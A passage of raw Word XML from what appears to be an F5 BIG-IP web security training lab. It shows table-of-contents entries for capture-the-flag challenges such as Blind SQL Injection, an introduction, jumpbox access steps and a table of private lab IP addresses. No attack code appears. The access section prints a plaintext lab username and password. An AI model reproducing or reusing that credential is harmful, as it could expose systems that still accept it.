            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296575 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>25</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="58D81086" w14:textId="359F38A9" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296576" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Challenge: Webscraping</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296576 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>26</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="73FED7B1" w14:textId="24E46862" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296577" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Challenge: BlindSQL Injection</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296577 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>30</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="12A59A8A" w14:textId="3B34D789" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296578" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsia="Calibri"/>
          </w:rPr>
          <w:t>Appendix A: Cyber Security – A Legal Perspective</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296578 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:t>35</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="76264FB6" w14:textId="4A80CA39" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296579" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Learn More</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296579 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:t>42</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="270EE76D" w14:textId="77777777" w:rsidR="00D04158" w:rsidRDefault="00AB6D64">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D0F61A" w14:textId="07D44BB9" w:rsidR="00D04158" w:rsidRDefault="00AB6D64">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="487DEB15" w14:textId="77777777" w:rsidR="00D04158" w:rsidRDefault="00D04158">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21B061D8" w14:textId="77777777" w:rsidR="00D04158" w:rsidRDefault="00D04158">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:sectPr w:rsidR="00D04158">
          <w:headerReference w:type="default" r:id="rId8"/>
          <w:footerReference w:type="default" r:id="rId9"/>
          <w:headerReference w:type="first" r:id="rId10"/>
          <w:pgSz w:w="12240" w:h="15840" w:code="1"/>
          <w:pgMar w:top="2880" w:right="994" w:bottom="1267" w:left="3600" w:header="720" w:footer="576" w:gutter="0"/>
          <w:pgNumType w:fmt="lowerRoman" w:start="1"/>
          <w:cols w:space="720"/>
          <w:titlePg/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06A66474" w14:textId="77777777" w:rsidR="00D04158" w:rsidRDefault="00260B28">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc487296562"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Introduction</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="182FE981" w14:textId="06846F04" w:rsidR="002074B6" w:rsidRDefault="00F47D73">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>In this lab, you will be introduced to a few standard tools used in identifying, testing, and mitigating exploits for web apps that live behind the BIG-IP platform.  You will also test your skills in a game of capture the flag in the lab environment detailed below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011DC086" w14:textId="77777777" w:rsidR="002074B6" w:rsidRDefault="002074B6" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc487296563"/>
      <w:r>
        <w:t>Lab Environment:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="6D6F932B" w14:textId="7826FA36" w:rsidR="002074B6" w:rsidRPr="002074B6" w:rsidRDefault="00CD6ED7" w:rsidP="002074B6">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="42B11735" wp14:editId="5FA124A6">
            <wp:extent cx="4850130" cy="2600325"/>
            <wp:effectExtent l="0" t="0" r="1270" b="0"/>
            <wp:docPr id="33" name="Picture 33" descr="../Desktop/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iagra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130" cy="2600325"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="613B8862" w14:textId="1214F58B" w:rsidR="00521D01" w:rsidRDefault="00521D01" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Accessing the Class Resources</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43EC0B84" w14:textId="65CF9432" w:rsidR="00521D01" w:rsidRPr="00B13D41" w:rsidRDefault="00521D01" w:rsidP="00521D01">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The class is running in a self-contained virtual/cloud environment.  To access the resources a Windows 7 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Jumpbox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> has been provided for the Student to RDP to and then access the required devices.  You will be provided with an IP address of the Windows 7 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Jumpbox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> when needed. </w:t>
      </w:r>
      <w:r w:rsidR="009A738D">
        <w:t xml:space="preserve">(Username: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="009A738D">
        <w:t>external_user</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="009A738D">
        <w:t xml:space="preserve"> / Password: 401elliottW</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="009A738D">
        <w:t>! )</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="009A738D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> You will also be provided the external IP address of the Kali Linux server which you will need for one of the labs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1405FB87" w14:textId="5182A0B7" w:rsidR="00521D01" w:rsidRDefault="00521D01" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
        <w:rPr>
          <w:color w:val="EB1C2D" w:themeColor="text2"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A65640" w14:textId="77777777" w:rsidR="00CB544B" w:rsidRDefault="00EA3568" w:rsidP="00CB544B">
      <w:pPr>
        <w:pStyle w:val="TableGraphtitle"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Network </w:t>
      </w:r>
      <w:r w:rsidR="00CB544B">
        <w:t>Resources</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Placeholder"/>
        <w:tblW w:w="7635" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="0420" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1342"/>
        <w:gridCol w:w="1260"/>
        <w:gridCol w:w="1530"/>
        <w:gridCol w:w="3503"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D4A34" w14:paraId="1ECB9A27" w14:textId="77777777" w:rsidTr="005D4A34">
        <w:trPr>
          <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1342" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5547B4B5" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecolumnheading"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3AEC6D54" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecolumnheading"/>
            </w:pPr>
            <w:r>
              <w:t>IP Address</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1B2B06BC" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecolumnheading"/>
            </w:pPr>
            <w:r>
              <w:t>Network</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5CAE1E41" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecolumnheading"/>
            </w:pPr>
            <w:r>
              <w:t>URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D4A34" w14:paraId="59B66290" w14:textId="77777777" w:rsidTr="005D4A34">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1342" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="03E58B49" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>Win 7 Client</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="181D1D14" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>10.1.10.90</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2FF14C87" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>External</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="57119CBA" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D4A34" w14:paraId="34E104C5" w14:textId="77777777" w:rsidTr="005D4A34">
        <w:trPr>
          <w:cnfStyle w:val="000000010000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="1" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1342" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="44F003BB" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>Win 7 Client</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="46CBF978" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>10.1.1.90</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1A2E56F3" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>Management</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7ECA6065" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D4A34" w14:paraId="3E6E57AC" w14:textId="77777777" w:rsidTr="005D4A34">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1342" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3780B9A2" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>KALI Linux</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="605E3AF1" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>10.1.10.240</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1A080725" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>External</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4106D6E1" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D4A34" w14:paraId="61A88AEA" w14:textId="77777777" w:rsidTr="005D4A34">
        <w:trPr>
          <w:cnfStyle w:val="000000010000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="1" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1342" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2A262479" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>F5 BIG-IP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1451F846" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>10.1.10.245</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="27AE3F64" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>External</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="62C2AE60" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D4A34" w14:paraId="42F4F734" w14:textId="77777777" w:rsidTr="005D4A34">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1342" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="19E61E62" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>F5 BIG-IP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2C28543E" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>10.1.1.245</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2234A2AC" w14:textId="07E97636" w:rsidR="00EA3568" w:rsidRDefault="005D4A34" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>Management</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="58515349" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D4A34" w14:paraId="330F59E1" w14:textId="77777777" w:rsidTr="005D4A34">
        <w:trPr>
          <w:cnfStyle w:val="000000010000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="1" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1342" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4ABC5E02" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>F5 BIG-IP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="376F3D95" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>10.1.20.245</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="419A4237" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>Internal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="55EAFD96" w14:textId="77777777" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D4A34" w14:paraId="35068FD5" w14:textId="77777777" w:rsidTr="005D4A34">
        <w:tc>
          <w:tcPr>
